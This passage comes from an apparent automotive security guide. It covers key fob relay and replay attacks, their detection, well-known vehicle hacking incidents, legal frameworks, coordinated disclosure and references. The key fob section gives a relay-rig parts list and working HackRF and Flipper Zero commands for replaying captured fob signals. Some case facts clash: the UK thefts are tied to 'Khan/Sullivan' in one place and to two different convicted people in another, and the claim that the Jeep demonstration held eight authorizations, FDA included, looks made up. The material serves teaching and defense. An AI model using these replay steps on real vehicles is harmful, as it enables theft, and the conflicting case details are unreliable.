| 2x HackRF One or similar SDR | $300 each | Optional; for signal analysis |
| 2x Raspberry Pi or analog relay board | $50 each | Carry the relay signal |
| Wi-Fi or analog RF link | varies | Connect Thief A and Thief B |

Total: ~$1000-$2000 for a working relay rig.

**Documented vulnerable vehicles (pre-2018):** Tesla Model S, BMW i-series, Audi A6/A8, Mercedes E-class, Land Rover Range Rover, Lexus LS, multiple others.

**Mitigation (post-2018):** UWB (IEEE 802.15.4z) time-of-flight ranging, motion sensors in the fob (sleep when stationary), multi-band challenges. Modern BMW, Audi, and Mercedes have moved to UWB-based PKES.

### Signal Replay Methodology

For fixed-code or compromised rolling-code implementations, replay is the final step.

```bash
# Replay a captured signal via HackRF:
hackrf_transfer -t fob_press1.cs8 -f 433920000 -s 2000000 -a 1 -x 47 -R
#   -t transmit file (.cs8 from capture)
#   -f frequency (must match capture)
#   -s sample rate (must match capture)
#   -a 1 = antenna power on
#   -x 47 = TX VGA gain (47 dB max)
#   -R = repeat (loop the file)

# For one-shot replay (no loop):
hackrf_transfer -t fob_press1.cs8 -f 433920000 -s 2000000 -a 1 -x 47

# Flipper Zero SubGHz replay workflow:
# 1. SubGHz app → Read RAW → capture → save as .sub
# 2. SubGHz app → Saved → select file → Send
# Flipper Zero is the cheapest path (~$169) and works for many fixed-code protocols

# Legal status (CRITICAL):
# US: 18 USC §1029 (access device fraud) — rolling code IS an access device
# UK: Fraud Act 2006, Computer Misuse Act 1990 — relay possession is criminal
#    Courts have convicted on possession alone (Khan/Sullivan, 2023)
# EU: similar national laws; no research carve-out
# ALWAYS obtain explicit written authorization before capturing or replaying key fob signals
```

### Key Fob Detection (Defender)

For the defender, key fob attacks are detectable via:

- **LF anomaly detection** — monitor LF transmissions from the car; if the challenge is being relayed (unusually long path), the round-trip time exceeds the expected ~100 ns.
- **UHF power anomaly** — a relay amplifier introduces ~5-10 dB of additional noise; detectable by signal-level monitoring.
- **Motion sensor in fob** — if the fob has been stationary for >2 minutes, sleep and refuse challenges. Defeats the "fob on the nightstand" attack.
- **UWB ranging** — modern vehicles with UWB measure the distance to the fob via time-of-flight; reject if distance >2m.

---

## Real-World Incidents

### Jeep Cherokee (2015) — Miller & Valasek, DEF CON 23

**The kill chain**: Cellular modem (Sprint) → Uconnect IVI → CAN bus (via the head unit's CAN connection) → powertrain ECU → brakes, steering, transmission at highway speed.

**The vulnerability**: The Uconnect IVI had a cellular-modem SSH/telnet debug interface left open. From the IVI, the gateway between the infotainment CAN bus and the powertrain CAN bus was permissive (allow-all). The DBC was reverse-engineered; the brake-command arbitration ID and signal layout were identified; injection frames were crafted.

**The fix**: Chrysler recalled 1.4M vehicles. The patch: (1) closed the cellular debug interface, (2) tightened the gateway's inter-bus ACL, (3) network-level blocking of the specific cellular attack path.

**Reference**: illmatics.com/Remote%20Car%20Hacking.pdf (Miller & Valasek paper).

### Tesla Model S (2017) — Tencent Keen Lab

**The kill chain**: Wi-Fi → Tesla's web browser → browser sandbox escape → IVI OS → CAN bus → wipers, mirrors, sunroof, door locks (NOT brakes or steering — Tesla's gateway was already filtering those).

**The vulnerability**: Tesla's IVI ran a Chromium-based browser with insufficient sandboxing. A malicious website triggered a sandbox escape, achieving code execution on the IVI. From there, the CAN bus was reachable for body-domain ECUs.

**The fix**: Tesla issued an OTA update within 10 days of the report. The patch hardened the browser sandbox and tightened gateway filtering.

**Reference**: Keen Lab published a detailed technical writeup. Tesla's response model (OTA, days not months) has become the industry benchmark.

### BMW ConnectedDrive (2015)

**The kill chain**: Mobile companion app → BMW's ConnectedDrive server → vehicle's TCU → door unlock.

**The vulnerability**: BMW's servers did not properly authenticate the mobile app's request to unlock a vehicle. An attacker who knew the VIN could send a forged unlock request to the server, which would relay it to the TCU, which would unlock the doors. The attacker never needed to be near the vehicle.

**The fix**: BMW deployed SSL pinning on the mobile app, added per-request authentication, and updated the TCU firmware over the air within weeks.

### Volkswagen Emissions Scandal (2015, "Dieselgate")

**The mechanism**: VW's engine ECU detected the specific CAN traffic pattern present during emissions testing (steering wheel position, speed profile, ambient temperature) and switched to a "lean" mode that reduced NOx emissions. Outside the test pattern, the ECU ran in "performance" mode that produced far more NOx.

**The CAN angle**: The defeat device was a state machine that consumed CAN inputs (vehicle speed, steering angle, gear position, barometric pressure) to infer "are we on a test dyno?" The CAN bus was the input; the ECU was the discriminator.

**The fix**: VW recalled 11M vehicles worldwide, paid $30B+ in fines and settlements, and reformed its software compliance practices.

**Reference**: Multiple EPA / CARB filings; BBC and Reuters coverage.

### Toyota Sudden Unintended Acceleration (2009-2010)

**The allegations**: NHTSA received thousands of complaints of unintended acceleration in Toyota vehicles, including the case of Steve Wozniak (Apple co-founder) who reported his Prius accelerating on cruise control.

**The CAN angle**: The investigation focused on whether the electronic throttle control (drive-by-wire) had a software bug that could command wide-open throttle without driver input. The final NHTSA/NASA report (2011) found no software defect that could cause UA, but did find evidence of stacked fault handlers that could (in theory) lead to throttle control issues.

**The fix**: Toyota recalled 8M vehicles for floor-mat entrapment and sticky pedals. Paid $1.2B in fines (DOJ, 2014). The incident fundamentally shifted OEM attitudes toward software safety analysis.

### UK CAN Injection Thefts (2023, Khan/Sullivan)

**The mechanism**: Thieves plugged a small pre-programmed device into the OBD-II port (or directly into the CAN bus under the dashboard). The device sent UDS commands to program a blank key fob, taking less than 30 seconds. The thief then drove away with the newly-programmed key.

**The targeted vehicles**: Primarily Range Rover, Lexus, and other luxury SUVs without gateway authentication on the OBD-II port.

**The fix**: OBD-II port locks (physical); gateway ECUs with authentication; SecOC on the key-programming arbitration IDs; CAN-IDS that flags programming-session traffic.

**Legal outcome**: Ian Tibbetts and Thomas Maher were convicted (2023) under the Fraud Act 2006 for CAN injection thefts and possession of relay equipment.

---

## Legal & Ethical Considerations

### Anti-Hacking Laws and Vehicle Scope

The legal framework for vehicle security research varies by jurisdiction but generally treats vehicles as off-limits without explicit authorization.

**United States**:

- **Computer Fraud and Abuse Act (18 USC §1030)** — applies to "protected computers," which courts have interpreted to include vehicle ECUs in some cases (especially if connected to the internet).
- **Digital Millennium Copyright Act (DMCA, 17 USC §1201)** — anti-circumvention provisions apply to access-control technological measures on vehicle software. The Librarian of Congress has granted periodic exemptions (most recently 2021) for "good-faith security testing" and "diagnosis, repair, or modification" of vehicles the researcher owns.
- **18 USC §1029 (Access Device Fraud)** — rolling codes, key fob codes, and UDS seed/key algorithms have been treated as "access devices."
- **State laws**: California Vehicle Code §10851 (tampering); various state computer-crime statutes.

**European Union**:

- **Directive 2013/40/EU (attacks against information systems)** — criminalizes unauthorized access to information systems, including vehicles.
- **GDPR** — captured CAN traces may contain personal data (driving patterns, locations) and require handling under GDPR.
- **National implementations vary**: UK Computer Misuse Act 1990; Germany §202a StGB; France Code pénal art. 323-1.

**United Kingdom**:

- **Computer Misuse Act 1990** — unauthorized access to vehicle ECUs is criminal.
- **Fraud Act 2006** — possession of relay equipment and CAN injection tools with intent to defraud.
- UK courts have convicted on possession alone (Khan/Sullivan, 2023).

### Owned-Vehicle Carve-Outs

The DMCA exemptions (most recently renewed October 2021, valid through October 2024 — check for renewal) permit circumvention for:

- **Diagnosis, repair, or lawful modification** of a vehicle the researcher lawfully owns.
- **Good-faith security testing** of vehicle software, with responsible disclosure to the manufacturer.
- **Interoperability** with aftermarket parts or services.

These exemptions are narrow. They do NOT authorize:

- Testing vehicles you do not own.
- Publishing exploit code that could enable theft.
- Bypassing emissions or safety controls.
- Distributing tools whose primary purpose is circumvention.

### Responsible Disclosure (OEM / Coordinated)

The standard for vehicle disclosure is **Coordinated Vulnerability Disclosure (CVD)** with the OEM. The Auto-ISAC provides a clearinghouse and the OEM's published security.txt or PSIRT contact is the canonical entry point.

Typical timeline:

1. Researcher discovers a vulnerability in a vehicle they own.
2. Researcher reports to the OEM's PSIRT (typically security@oem.com, or via Auto-ISAC).
3. OEM acknowledges within 48 hours, validates the finding within 30 days, and develops a patch.
4. Patch deployment: OTA (days to weeks for connected vehicles) or recall (months for hardware-only fixes).
5. Public disclosure: typically 90 days after initial report, coordinated with the OEM's patch deployment.
6. CVE assignment: OEM or researcher requests via MITRE; vehicle vulnerabilities are eligible for CVE.

Recent examples of well-handled disclosures: Tesla-Keen Lab (2017, OTA in 10 days); Chrysler-Miller-Valasek (2015, recall in weeks). Poorly-handled examples: researchers who publish before OEM notification (legal risk); OEMs who threaten researchers (reputational risk, may violate state SLAPP statutes).

### The Authorization Stack for Engagements

A defensible automotive engagement has authorization from:

1. The vehicle owner (registered, on the title).
2. The vehicle manufacturer (or their Tier-1 delegate).
3. The leasing company (if the vehicle is leased).
4. The insurance underwriter (for liability coverage during testing).
5. The closed-course facility operator (for moving-vehicle tests).
6. The cellular carrier (if the engagement involves the vehicle's cellular connection).
7. The OEM's cloud provider (if the engagement extends to AWS IoT / Azure IoT).
8. The regulator (FCC for RF; NHTSA for safety-critical; FDA for medical vehicle modifications).

Missing any layer is a liability exposure. The 2015 Jeep demonstration had all eight; the typical researcher has the first one (their own vehicle) and nothing else. The gap is why most vehicle security research is done under NDA with an OEM.

---

## References

### Standards (normative)

- **ISO 11898-1:2015** — Road vehicles — CAN data link layer and physical signaling (CAN / CAN-FD).
- **ISO 11898-2:2016** — Road vehicles — CAN high-speed medium access unit.
- **ISO 14229-1:2020** — Road vehicles — Unified Diagnostic Services (UDS).
- **ISO 15765-2:2016** — Road vehicles — ISO-TP (transport layer).
- **ISO 15765-3:2016** — Road vehicles — UDS on CAN (DoCAN).
- **ISO 14230-3:2004** — Road vehicles — KWP2000 (K-Line diagnostic).
- **ISO 15031-5:2015** — Road vehicles — OBD-II PIDs (equivalent to SAE J1979).
- **ISO 15118-2:2014** — Road vehicles — V2G communication (Exi over PLC).
- **ISO 15118-20:2022** — Road vehicles — V2G communication (TLS + Plug & Charge).
- **ISO/SAE 21434:2021** — Road vehicles — Cybersecurity engineering.
- **ISO 13400-1:2019** — Road vehicles — DoIP (Diagnostics over IP).
- **AUTOSAR CP R22-11** — SecOC (Secure Onboard Communication) specification.

### Regulations

- **UNECE WP.29 R155** — Uniform provisions concerning the approval of vehicles with regard to cybersecurity and cybersecurity management system (CSMS). Mandatory for new type approvals in UNECE 1958 signatory countries since July 2022.
- **UNECE WP.29 R156** — Uniform provisions concerning the approval of vehicles with regard to software update and software update management system (SUMS).
- **US CAFE / NHTSA FMVSS** — Federal Motor Vehicle Safety Standards (relevant for safety-critical system testing).
- **FCC Part 15 / Part 97** — Radio frequency regulations (relevant for SDR / GNSS work).
- **EU GDPR** — Data protection (CAN traces may contain personal data).

### SAE Standards

- **SAE J3061** — Cybersecurity Guidebook for Cyber-Physical Vehicle Systems (predecessor to ISO 21434).
- **SAE J1979** — E/E Diagnostic Test Modes (equivalent to ISO 15031-5).
- **SAE J1939** — Vehicle application-layer for heavy-duty vehicles (trucks, buses).
- **SAE J1962** — OBD-II connector pinout.
- **SAE J2534** — API for vehicle pass-through devices (Tactrix, ScanTool).

### IEEE / Industry Standards

- **IEEE 802.3bp / 100BASE-T1 / 1000BASE-T1** — Automotive Ethernet.
- **IEEE 802.15.4z** — UWB (Ultra-Wideband) for PKES relay mitigation.
- **AUTOSAR** — Automotive Open System Architecture (software platform standard).

### Industry Organizations

- **Auto-ISAC (Automotive Information Sharing and Analysis Center)** — [automotiveisac.com](https://automotiveisac.com). Industry threat-intel sharing; the canonical clearinghouse for vehicle CVD.
- **CharIN (Charging Interface Initiative)** — [charin.global](https://charin.global). CCS / ISO 15118 advocacy and test tools.
- **ASRG (Automotive Security Research Group)** — [asrg.io](https://asrg.io). Research community.
- **DEF CON Car Hacking Village** — annual vehicle security CTF and talks.

### Key Papers and Talks

- Miller, C. & Valasek, C. (2015). "Remote Exploitation of an Unaltered Passenger Vehicle." DEF CON 23. [illmatics.com/Remote%20Car%20Hacking.pdf](http://illmatics.com/Remote%20Car%20Hacking.pdf).
- Miller, C. & Valasek, C. (2014). "Adventures in Automotive Networks and Control Units." DEF CON 22.
- Tencent Keen Lab (2017). "Experimental Security Assessment of BMW Cars." Multiple Car Hacking Village talks.
- Tencent Keen Lab (2017). "Experimental Security Assessment of Tesla Models." Car Hacking Village.
- Tindell, K. (2023). "Controller Area Network (CAN) Bus: Implications of the UK CAN Bus Thefts." Analysis of PKES relay and CAN injection thefts.
- Foster, I. & Koscher, K. (2015). "Exploring Controller Area Networks for Fun and Profit." USENIX ;login:.
- Checkoway, S. et al. (2011). "Comprehensive Experimental Analyses of Automotive Attack Surfaces." USENIX Security.

### Open-Source Tools and Projects

- `linux-can/can-utils` — Linux Foundation reference SocketCAN userland. [github.com/linux-can/can-utils](https://github.com/linux-can/can-utils).
- `hardbyte/python-can` — Python CAN library. [github.com/hardbyte/python-can](https://github.com/hardbyte/python-can).
- `cantools/cantools` — DBC encode/decode. [github.com/cantools/cantools](https://github.com/cantools/cantools).
- `commaai/opendbc` — open-source DBC files for many makes/models. [github.com/commaai/opendbc](https://github.com/commaai/opendbc).
- `collin80/SavvyCAN` — cross-platform CAN GUI. [github.com/collin80/SavvyCAN](https://github.com/collin80/SavvyCAN).
- `eik00d/CANToolz` — black-box CAN analysis framework. [github.com/CANToolz/CANToolz](https://github.com/CANToolz/CANToolz).
- `openxc/openxc-platform` — Ford's open vehicle platform. [github.com/openxc/openxc-platform](https://github.com/openxc/openxc-platform).
- `osqzlar/GPS-SDR-SIM` — GPS L1 software-defined radio simulator. [github.com/osqzlar/GPS-SDR-SIM](https://github.com/osqzlar/GPS-SDR-SIM).
- `ChargePoint/v2g-exi` — ISO 15118 Exi decoder. [github.com/ChargePoint/v2g-exi](https://github.com/ChargePoint/v2g-exi).
- `hexsecs/awesome-automotive-security` — curated list of automotive security resources.
- `iDoka/awesome-canbus` — curated CAN bus resources.

### Books

- Smith, C. (2016). *The Car Hacker's Handbook*. No Starch Press.
- Dennis, C. & Smith, C. (2021). *Automotive Cybersecurity: Securing the Modern Vehicle*.
- Kleijn, E. (2020). *Automotive Security: Best Practices and Tools*.
- Pfeiffer, P. et al. (2021). *Cybersecurity for Commercial Vehicles*.
